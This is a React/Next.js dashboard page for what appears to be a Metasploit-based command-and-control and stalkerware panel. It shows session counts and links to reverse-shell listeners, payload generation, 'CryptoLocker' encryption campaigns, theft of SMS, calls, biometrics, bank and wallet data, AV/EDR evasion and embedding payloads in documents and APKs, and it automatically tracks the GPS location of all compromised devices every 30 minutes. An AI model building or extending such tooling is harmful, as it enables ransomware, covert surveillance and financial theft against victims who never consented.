"use client";

import { useEffect, useState, useCallback } from "react";
import Link from "next/link";
import { useToast } from "@/components/toast";

type Stats = {
  sessions: number;
  listeners: number;
  workspaces: number;
  backend: "online" | "offline" | "demo";
  version?: string;
};

type Activity = { ts: string; msg: string; tone: "info" | "success" | "warn" };

const QUICK = [
  { href: "/agents",    label: "Agent Control",   sub: "Send commands to sessions", accent: true  },
  { href: "/listeners", label: "Start Listener",   sub: "multi/handler reverse shell" },
  { href: "/payloads",  label: "Generate Payload", sub: "msfvenom wrapper" },
  { href: "/locker",    label: "CryptoLocker",     sub: "Encryption campaigns",      accent: true  },
  { href: "/modules",   label: "Modules",          sub: "Exploit & auxiliary browser" },
  { href: "/sessions",  label: "Sessions",         sub: "View active connections" },
  { href: "/map",       label: "Live Map",         sub: "GPS tracker — all devices" },
  { href: "/comms",     label: "Comms Intel",      sub: "Calls · SMS · Social media" },
  { href: "/biometrics",label: "Biometrics",       sub: "Lock · Passkeys · Keystore" },
  { href: "/finance",   label: "Finance Intel",   sub: "Wallets · Banks · OTP · TX" },
  { href: "/network",   label: "Network Ops",     sub: "LAN · WiFi · Router · Pivot" },
  { href: "/evasion",   label: "AV/EDR Evasion",  sub: "Defender · AMSI · ETW · UAC" },
  { href: "/embed",     label: "Payload Embed",    sub: "PDF · Video · Office · APK" },
];

function LiveClock() {
  const [time, setTime] = useState(() => new Date());
  useEffect(() => {
    const t = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(t);
  }, []);
  return (
    <div className="text-right">
      <p className="font-mono text-3xl font-bold tabular-nums tracking-tight text-white">
        {time.toLocaleTimeString("en-US", { hour12: false })}
      </p>
      <p className="mt-0.5 text-[9px] uppercase tracking-[0.18em] text-slate-600">
        {time.toLocaleDateString("en-US", { weekday: "short", month: "short", day: "numeric", year: "numeric" }).toUpperCase()}
      </p>
    </div>
  );
}

export default function Dashboard() {
  const [stats, setStats] = useState<Stats>({ sessions: 0, listeners: 0, workspaces: 0, backend: "offline" });
  const [loading, setLoading] = useState(true);
  const [log, setLog] = useState<Activity[]>([]);
  const { toast } = useToast();

  const addLog = useCallback((msg: string, tone: Activity["tone"] = "info") => {
    setLog(prev => [{ ts: new Date().toISOString(), msg, tone }, ...prev].slice(0, 20));
  }, []);

  const load = useCallback(async () => {
    try {
      const [h, s, l, w] = await Promise.allSettled([
        fetch("/api/health").then(r => r.json()),
        fetch("/api/agents?action=sessions").then(r => r.json()),
        fetch("/api/listeners").then(r => r.json()),
        fetch("/api/workspaces").then(r => r.json()),
      ]);

      const health    = h.status === "fulfilled" ? h.value : null;
      const sessions  = s.status === "fulfilled" ? s.value : null;
      const listeners = l.status === "fulfilled" ? l.value : null;
      const workspaces= w.status === "fulfilled" ? w.value : null;

      const prev = stats;
      const newStats: Stats = {
        sessions:   sessions?.sessions?.length ?? 0,
        listeners:  listeners?.listeners?.length ?? 0,
        workspaces: workspaces?.workspaces?.length ?? 0,
        backend:    health?.demo ? "demo" : health?.connected ? "online" : "offline",
        version:    health?.version,
      };

      if (!loading && newStats.sessions > prev.sessions) {
        addLog(`New session connected (total: ${newStats.sessions})`, "success");
        toast(`New session! Total: ${newStats.sessions}`, "success");
      }
      if (!loading && newStats.sessions < prev.sessions && prev.sessions > 0) {
        addLog(`Session dropped (total: ${newStats.sessions})`, "warn");
      }
      if (loading) {
        addLog(`Backend ${newStats.backend === "online" ? "connected" : newStats.backend}${health?.version ? ` — MSF ${health.version}` : ""}`, newStats.backend === "online" ? "success" : "info");
      }

      setStats(newStats);
    } catch {
      // silent
    } finally {
      setLoading(false);
    }
  }, [loading, stats, addLog, toast]);

  useEffect(() => { load(); }, []); // eslint-disable-line react-hooks/exhaustive-deps
  useEffect(() => {
    const t = setInterval(load, 10000);
    return () => clearInterval(t);
  }, [load]);

  // Flush offline queue every 60s
  useEffect(() => {
    const t = setInterval(() => fetch("/api/sync", { method: "POST" }).catch(() => {}), 60000);
    return () => clearInterval(t);
  }, []);

  // Auto-track all session locations every 30 minutes
  useEffect(() => {
    const track = () =>
      fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "track_all" }),
      })
        .then((r) => r.json())
        .then((d) => { if (d.captured > 0) addLog(`Location: ${d.captured} device(s) tracked`, "info"); })
        .catch(() => {});
    // Initial capture after 10s (give sessions time to appear)
    const init = setTimeout(track, 10000);
    const t = setInterval(track, 30 * 60 * 1000);
    return () => { clearTimeout(init); clearInterval(t); };
  }, [addLog]);

  const dotColor =
    stats.backend === "online" ? "bg-green-500" :
    stats.backend === "demo"   ? "bg-amber-500" :
                                 "bg-red-500";
  const backendLabel =
    stats.backend === "online" ? "CONNECTED" :
    stats.backend === "demo"   ? "DEMO MODE" :
                                 "OFFLINE";
  const backendText =
    stats.backend === "online" ? "text-green-400" :
    stats.backend === "demo"   ? "text-amber-400" :
                                 "text-red-400";

  return (
    <div className="mx-auto max-w-5xl space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between border-b border-white/[0.05] pb-5">
        <div>
          <p className="text-[9px] font-semibold uppercase tracking-[0.22em] text-slate-600">Command Center</p>
          <div className="mt-2 flex items-center gap-3">
            <span className={`h-2 w-2 rounded-full ${dotColor} status-pulse`} />
            <span className={`text-[10px] font-semibold uppercase tracking-widest ${backendText}`}>{backendLabel}</span>
            {stats.version && (
              <span className="font-mono text-[9px] text-slate-700">· MSF {stats.version}</span>
            )}
          </div>
        </div>
        <LiveClock />
      </div>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-3">
        {[
          { label: "ACTIVE SESSIONS", value: stats.sessions, color: stats.sessions > 0 ? "text-green-400" : "text-slate-700", accent: stats.sessions > 0 },
          { label: "LISTENERS",       value: stats.listeners, color: stats.listeners > 0 ? "text-cyan-400" : "text-slate-700", accent: false },
          { label: "WORKSPACES",      value: stats.workspaces, color: "text-slate-400", accent: false },
        ].map(s => (
          <div key={s.label} className={`rounded border px-5 py-4 ${s.accent ? "border-green-900/30 bg-green-950/10" : "border-white/[0.05] bg-white/[0.02]"}`}>
            <p className="text-[8px] font-semibold uppercase tracking-[0.18em] text-slate-600">{s.label}</p>
            <p className={`mt-2 font-mono text-4xl font-bold tabular-nums ${s.color}`}>
              {loading ? "—" : s.value}
            </p>
          </div>
        ))}
      </div>

      {/* Quick actions */}
      <div>
        <p className="mb-3 text-[9px] font-semibold uppercase tracking-[0.2em] text-slate-600">Quick Actions</p>
        <div className="grid grid-cols-2 gap-2 sm:grid-cols-3">
          {QUICK.map(q => (
            <Link
              key={q.href}
              href={q.href}
              className={`group flex flex-col rounded border p-4 transition-all ${
                q.accent
                  ? "border-red-900/30 bg-red-950/10 hover:border-red-800/50 hover:bg-red-950/20"
                  : "border-white/[0.05] bg-white/[0.02] hover:border-white/[0.10] hover:bg-white/[0.04]"
              }`}
            >
              <p className={`text-[12px] font-semibold transition ${q.accent ? "text-red-400 group-hover:text-red-300" : "text-slate-300 group-hover:text-white"}`}>
                {q.label}
              </p>
              <p className="mt-0.5 text-[10px] text-slate-600">{q.sub}</p>
              <p className="mt-3 text-[9px] uppercase tracking-widest text-slate-700 transition group-hover:text-slate-500">
                Open ›
              </p>
            </Link>
          ))}
        </div>
      </div>

      {/* Activity log */}
      <div>
        <div className="mb-3 flex items-center justify-between">
          <p className="text-[9px] font-semibold uppercase tracking-[0.2em] text-slate-600">Activity Log</p>
          {log.length > 0 && (
            <button type="button" onClick={() => setLog([])} className="text-[9px] text-slate-700 transition hover:text-slate-500">
              Clear
            </button>
          )}
        </div>
        <div className="rounded border border-white/[0.05] bg-[#05050c] p-4 font-mono">
          {log.length === 0 && (
            <p className="text-[10px] text-slate-700 cursor-blink">Monitoring...</p>
          )}
          {log.map((entry, i) => (
            <div key={i} className="flex gap-3 py-0.5">
              <span className="shrink-0 text-[9px] text-slate-700">
                {new Date(entry.ts).toLocaleTimeString("en-US", { hour12: false })}
              </span>
              <span className={`text-[10px] ${
                entry.tone === "success" ? "text-green-500" :
                entry.tone === "warn"    ? "text-amber-500" :
                                           "text-slate-400"
              }`}>
                {entry.msg}
              </span>
            </div>
          ))}
        </div>
      </div>

      {/* Shortcut hint */}
      <div className="flex items-center justify-center gap-2 pb-2">
        <kbd className="rounded border border-white/[0.06] px-1.5 py-0.5 text-[9px] text-slate-700">⌘K</kbd>
        <span className="text-[9px] text-slate-700">Command palette</span>
      </div>
    </div>
  );
}
